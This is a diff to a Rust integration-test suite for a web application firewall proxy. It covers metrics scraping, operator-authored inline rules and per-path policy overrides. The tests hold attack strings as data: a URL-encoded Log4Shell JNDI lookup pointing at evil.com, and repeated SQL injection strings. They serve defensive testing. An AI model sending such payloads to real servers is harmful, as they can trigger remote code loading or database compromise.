@@ -77,6 +77,7 @@ fn test_config(
                     tls: false,
                 }],
                 health_check: None,
+                timeout_secs: None,
             },
             waf: WafConfig {
                 mode,
@@ -118,6 +119,7 @@ fn ml_only_config(listen_port: u16, upstream_port: u16, sensitivity: f32) -> Sen
                     tls: false,
                 }],
                 health_check: None,
+                timeout_secs: None,
             },
             waf: WafConfig {
                 mode: WafMode::Blocking,
@@ -358,6 +360,37 @@ async fn health_check_endpoint() {
 }
 
 #[tokio::test]
+async fn metrics_endpoint_is_scrapeable() {
+    let (upstream_addr, _upstream_handle) = start_mock_upstream().await;
+    let listen_port = next_port();
+    let cfg = test_config(
+        listen_port,
+        upstream_addr.port(),
+        "REQUEST-942-APPLICATION-ATTACK-SQLI.conf",
+        WafMode::Blocking,
+    );
+    let (shutdown_tx, jh) = start_proxy(cfg).await;
+
+    // Drive one real request first so the counters have moved, then scrape.
+    let _ = send_request(listen_port, "test-site.local", "/", Method::GET, "").await;
+    let (status, body) =
+        send_request(listen_port, "test-site.local", "/metrics", Method::GET, "").await;
+
+    shutdown_proxy(shutdown_tx, jh).await;
+
+    assert_eq!(status, StatusCode::OK, "/metrics should return 200");
+    let text = String::from_utf8(body).expect("metrics body is UTF-8");
+    // Prometheus exposition format with the WAF counters present.
+    assert!(
+        text.contains("# TYPE sentinel_requests_total counter"),
+        "expected prometheus TYPE header, got:\n{text}"
+    );
+    assert!(text.contains("sentinel_requests_total"));
+    assert!(text.contains("sentinel_blocked_total"));
+    assert!(text.contains("sentinel_active_connections"));
+}
+
+#[tokio::test]
 async fn post_body_sqli_is_blocked() {
     let (upstream_addr, _upstream_handle) = start_mock_upstream().await;
     let listen_port = next_port();
@@ -547,4 +580,437 @@ async fn e2e_ml_allows_clean_request_with_no_rules() {
         "clean request must pass ML, got {status}"
     );
     assert!(body.starts_with(b"upstream-ok:"));
+}
+
+// ---------------------------------------------------------------------------
+// Operator-authored (inline) rules from the control plane.
+//
+// Until 2026-07-28 these were stored in Postgres and never delivered, so a rule
+// written in the UI showed as "enabled" and did nothing. These tests exercise the
+// delivered path end-to-end through a real proxy, and pin the two failure
+// behaviours that decide whether the feature is safe to expose to a customer.
+// ---------------------------------------------------------------------------
+
+use sentinel_core::config::InlineRule;
+
+// Real SRL. NOTE: the rule's name IS its numeric id, and the operator form is
+// `rx /pattern/` — not the `rule foo { id: N; op: rx("...") }` shape that the
+// seeded sample rules use, which does not parse at all.
+const LOG4SHELL_SRL: &str = r#"
+rule 9999900 {
+    phase    : request_body
+    targets  : ARGS
+    operator : rx /\$\{jndi:/
+    action   : block
+    severity : critical
+    message  : "Log4Shell JNDI lookup"
+}
+"#;
+
+const MARKER_SRL: &str = r#"
+rule 9999901 {
+    phase    : request_body
+    targets  : ARGS
+    operator : rx /EVILMARKER/
+    action   : block
+    severity : critical
+    message  : "test marker"
+}
+"#;
+
+const SHADOW_SRL: &str = r#"
+rule 942100 {
+    phase    : request_body
+    targets  : ARGS
+    operator : rx /NEVERMATCHES/
+    action   : log
+    severity : info
+    message  : "attempted shadow of a shipped rule id"
+}
+"#;
+
+/// A site carrying ONLY inline rules — no rule files at all — so any block is
+/// necessarily produced by the inline path and nothing else.
+fn inline_only_config(
+    listen_port: u16,
+    upstream_port: u16,
+    inline: Vec<InlineRule>,
+) -> SentinelConfig {
+    SentinelConfig {
+        listeners: vec![ListenerConfig {
+            name: "test".into(),
+            bind: format!("127.0.0.1:{listen_port}"),
+            protocol: ProtocolSpec::Single(Protocol::Http1),
+            tls: None,
+            default_site: Some("test-site".into()),
+            role: Default::default(),
+        }],
+        sites: vec![SiteConfig {
+            id: "test-site".into(),
+            tenant_id: String::new(),
+            domains: vec!["test-site.local".into(), "localhost".into()],
+            upstream: UpstreamConfig {
+                load_balancer: sentinel_core::config::LoadBalancerStrategy::RoundRobin,
+                servers: vec![UpstreamServer {
+                    host: "127.0.0.1".into(),
+                    port: upstream_port,
+                    weight: 1,
+                    tls: false,
+                }],
+                health_check: None,
+                timeout_secs: None,
+            },
+            waf: WafConfig {
+                mode: WafMode::Blocking,
+                rules: vec![],
+                inline_rules: inline,
+                anomaly_threshold: 5,
+                paranoia_level: 2,
+                ..Default::default()
+            },
+            plugins: vec![],
+            tls: Default::default(),
+        }],
+        ..Default::default()
+    }
+}
+
+/// The headline case: a virtual patch written by an operator actually blocks.
+/// Modelled on the Log4Shell shape, which is why the feature exists — a CVE lands
+/// and waiting for a data-plane image rebuild is not an option.
+#[tokio::test]
+async fn inline_rule_from_control_plane_is_enforced() {
+    let (upstream_addr, _upstream_handle) = start_mock_upstream().await;
+    let listen_port = next_port();
+    let cfg = inline_only_config(
+        listen_port,
+        upstream_addr.port(),
+        vec![InlineRule {
+            name: "VP-CVE-2021-44228".into(),
+            dsl: LOG4SHELL_SRL.into(),
+        }],
+    );
+    let (shutdown_tx, jh) = start_proxy(cfg).await;
+
+    let (blocked, _) = send_request(
+        listen_port,
+        "test-site.local",
+        "/?x=%24%7Bjndi%3Aldap%3A%2F%2Fevil.com%2Fa%7D",
+        Method::GET,
+        "",
+    )
+    .await;
+    let (allowed, _) =
+        send_request(listen_port, "test-site.local", "/?x=ok", Method::GET, "").await;
+
+    shutdown_proxy(shutdown_tx, jh).await;
+    assert_eq!(
+        blocked,
+        StatusCode::FORBIDDEN,
+        "an operator-authored rule must actually block; if this is 200 the rule \
+         reached the data plane but was not enforced"
+    );
+    assert_eq!(
+        allowed,
+        StatusCode::OK,
+        "the inline rule must not block unrelated traffic"
+    );
+}
+
+/// A rule typed into a web form WILL sometimes be malformed. One bad row must not
+/// disarm the rules around it — that would turn an operator typo into an outage,
+/// and it is the difference between this feature being safe to expose or not.
+#[tokio::test]
+async fn one_malformed_inline_rule_does_not_disarm_the_others() {
+    let (upstream_addr, _upstream_handle) = start_mock_upstream().await;
+    let listen_port = next_port();
+    let cfg = inline_only_config(
+        listen_port,
+        upstream_addr.port(),
+        vec![
+            InlineRule {
+                name: "broken-rule".into(),
+                dsl: "rule oops { this is not valid SRL at all ((( ".into(),
+            },
+            InlineRule {
+                name: "good-rule".into(),
+                dsl: MARKER_SRL.into(),
+            },
+        ],
+    );
+    let (shutdown_tx, jh) = start_proxy(cfg).await;
+
+    let (status, _) = send_request(
+        listen_port,
+        "test-site.local",
+        "/?q=EVILMARKER",
+        Method::GET,
+        "",
+    )
+    .await;
+
+    shutdown_proxy(shutdown_tx, jh).await;
+    assert_eq!(
+        status,
+        StatusCode::FORBIDDEN,
+        "the valid rule must still be enforced despite a malformed sibling"
+    );
+}
+
+/// An inline rule reusing a shipped rule's id is refused rather than allowed to
+/// shadow it: with two rules answering to one id, an exclusion for that id cannot
+/// say which one it means, and scoring silently doubles.
+#[tokio::test]
+async fn inline_rule_may_not_shadow_a_shipped_rule_id() {
+    let (upstream_addr, _upstream_handle) = start_mock_upstream().await;
+    let listen_port = next_port();
+
+    // Load the real CRS SQLi file, then try to redefine 942100 as a no-op that
+    // would allow traffic the genuine rule blocks.
+    let rule_path = crs_rule_dir().join("REQUEST-942-APPLICATION-ATTACK-SQLI.conf");
+    let mut cfg = inline_only_config(listen_port, upstream_addr.port(), vec![]);
+    cfg.sites[0].waf.rules = vec![rule_path.to_string_lossy().to_string()];
+    cfg.sites[0].waf.inline_rules = vec![InlineRule {
+        name: "shadow-942100".into(),
+        dsl: SHADOW_SRL.into(),
+    }];
+    let (shutdown_tx, jh) = start_proxy(cfg).await;
+
+    let (status, _) = send_request(
+        listen_port,
+        "test-site.local",
+        "/search?q=1%27%20OR%201%3D1--",
+        Method::GET,
+        "",
+    )
+    .await;
+
+    shutdown_proxy(shutdown_tx, jh).await;
+    assert_eq!(
+        status,
+        StatusCode::FORBIDDEN,
+        "the shipped 942100 must still block; a colliding inline rule must be \
+         refused, not allowed to override it"
+    );
+}
+
+// ---------------------------------------------------------------------------
+// Per-path policy overrides.
+//
+// A site used to have exactly one policy, so an operator had to pick a single
+// strictness that was necessarily wrong for part of the application. These pin
+// the three behaviours that make the feature real rather than decorative:
+// a stricter path blocks what the site would allow, a detect-only path lets
+// through what the site would block, and an off path is genuinely exempt.
+// ---------------------------------------------------------------------------
+
+use sentinel_core::config::PathOverride;
+
+/// A site with the CRS SQLi rules, a site-level threshold, and path overrides.
+fn path_override_config(
+    listen_port: u16,
+    upstream_port: u16,
+    site_threshold: u32,
+    overrides: Vec<PathOverride>,
+) -> SentinelConfig {
+    let rule_path = crs_rule_dir().join("REQUEST-942-APPLICATION-ATTACK-SQLI.conf");
+    let mut cfg = test_config(
+        listen_port,
+        upstream_port,
+        "REQUEST-942-APPLICATION-ATTACK-SQLI.conf",
+        WafMode::Blocking,
+    );
+    cfg.sites[0].waf.rules = vec![rule_path.to_string_lossy().to_string()];
+    cfg.sites[0].waf.anomaly_threshold = site_threshold;
+    cfg.sites[0].waf.path_overrides = overrides;
+    cfg
+}
+
+/// A path in learning mode must pass an attack the rest of the site blocks.
+/// This is the "legacy endpoint we are still fixing" case.
+#[tokio::test]
+async fn path_override_learning_lets_attack_through() {
+    let (upstream_addr, _upstream_handle) = start_mock_upstream().await;
+    let listen_port = next_port();
+    let cfg = path_override_config(
+        listen_port,
+        upstream_addr.port(),
+        5,
+        vec![PathOverride {
+            path_prefix: "/legacy/".into(),
+            mode: Some(WafMode::Learning),
+            anomaly_threshold: None,
+        }],
+    );
+    let (shutdown_tx, jh) = start_proxy(cfg).await;
+
+    let attack = "?q=1%27%20OR%201%3D1--";
+    let (on_legacy, _) = send_request(
+        listen_port,
+        "test-site.local",
+        &format!("/legacy/report{attack}"),
+        Method::GET,
+        "",
+    )
+    .await;
+    let (elsewhere, _) = send_request(
+        listen_port,
+        "test-site.local",
+        &format!("/search{attack}"),
+        Method::GET,
+        "",
+    )
+    .await;
+
+    shutdown_proxy(shutdown_tx, jh).await;
+    assert_eq!(
+        on_legacy,
+        StatusCode::OK,
+        "/legacy/ is learning-mode: the attack must be recorded, not blocked"
+    );
+    assert_eq!(
+        elsewhere,
+        StatusCode::FORBIDDEN,
+        "the same attack outside the override must still block"
+    );
+}
+
+/// A path in `off` mode is genuinely exempt — the case for static assets, where
+/// the WAF only costs latency and false positives.
+#[tokio::test]
+async fn path_override_off_exempts_the_path() {
+    let (upstream_addr, _upstream_handle) = start_mock_upstream().await;
+    let listen_port = next_port();
+    let cfg = path_override_config(
+        listen_port,
+        upstream_addr.port(),
+        5,
+        vec![PathOverride {
+            path_prefix: "/assets/".into(),
+            mode: Some(WafMode::Off),
+            anomaly_threshold: None,
+        }],
+    );
+    let (shutdown_tx, jh) = start_proxy(cfg).await;
+
+    let (status, _) = send_request(
+        listen_port,
+        "test-site.local",
+        "/assets/app.js?q=1%27%20OR%201%3D1--",
+        Method::GET,
+        "",
+    )
+    .await;
+
+    shutdown_proxy(shutdown_tx, jh).await;
+    assert_eq!(
+        status,
+        StatusCode::OK,
+        "an `off` path must pass traffic regardless of what the rules found"
+    );
+}
+
+/// Longest prefix wins, independently of declaration order — otherwise an
+/// operator's policy depends on the order they happened to add rows in, which is
+/// not a property a security control may have.
+#[tokio::test]
+async fn path_override_longest_prefix_wins() {
+    let (upstream_addr, _upstream_handle) = start_mock_upstream().await;
+    let listen_port = next_port();
+    // The SHORTER, more permissive prefix is declared first on purpose.
+    let cfg = path_override_config(
+        listen_port,
+        upstream_addr.port(),
+        5,
+        vec![
+            PathOverride {
+                path_prefix: "/api/".into(),
+                mode: Some(WafMode::Off),
+                anomaly_threshold: None,
+            },
+            PathOverride {
+                path_prefix: "/api/admin/".into(),
+                mode: Some(WafMode::Blocking),
+                anomaly_threshold: None,
+            },
+        ],
+    );
+    let (shutdown_tx, jh) = start_proxy(cfg).await;
+
+    let attack = "?q=1%27%20OR%201%3D1--";
+    let (on_api, _) = send_request(
+        listen_port,
+        "test-site.local",
+        &format!("/api/list{attack}"),
+        Method::GET,
+        "",
+    )
+    .await;
+    let (on_admin, _) = send_request(
+        listen_port,
+        "test-site.local",
+        &format!("/api/admin/users{attack}"),
+        Method::GET,
+        "",
+    )
+    .await;
+
+    shutdown_proxy(shutdown_tx, jh).await;
+    assert_eq!(on_api, StatusCode::OK, "/api/ is off");
+    assert_eq!(
+        on_admin,
+        StatusCode::FORBIDDEN,
+        "/api/admin/ is the longer prefix and must win over /api/ despite being \
+         declared second"
+    );
+}
+
+/// A path may also be made STRICTER than the site. The site threshold is set
+/// high enough that the CRS score for this request does not reach it, while the
+/// override's lower threshold does — so only the override can produce the block.
+#[tokio::test]
+async fn path_override_can_be_stricter_than_the_site() {
+    let (upstream_addr, _upstream_handle) = start_mock_upstream().await;
+    let listen_port = next_port();
+    let cfg = path_override_config(
+        listen_port,
+        upstream_addr.port(),
+        1000, // effectively "never block on score" for the rest of the site
+        vec![PathOverride {
+            path_prefix: "/api/".into(),
+            mode: None,
+            anomaly_threshold: Some(3),
+        }],
+    );
+    let (shutdown_tx, jh) = start_proxy(cfg).await;
+
+    let attack = "?q=1%27%20OR%201%3D1--";
+    let (on_api, _) = send_request(
+        listen_port,
+        "test-site.local",
+        &format!("/api/list{attack}"),
+        Method::GET,
+        "",
+    )
+    .await;
+    let (elsewhere, _) = send_request(
+        listen_port,
+        "test-site.local",
+        &format!("/search{attack}"),
+        Method::GET,
+        "",
+    )
+    .await;
+
+    shutdown_proxy(shutdown_tx, jh).await;
+    assert_eq!(
+        on_api,
+        StatusCode::FORBIDDEN,
+        "/api/ has threshold 3 and must block on the accumulated score"
+    );
+    assert_eq!(
+        elsewhere,
+        StatusCode::OK,
+        "the site threshold of 1000 must still apply outside the override"
+    );
 }
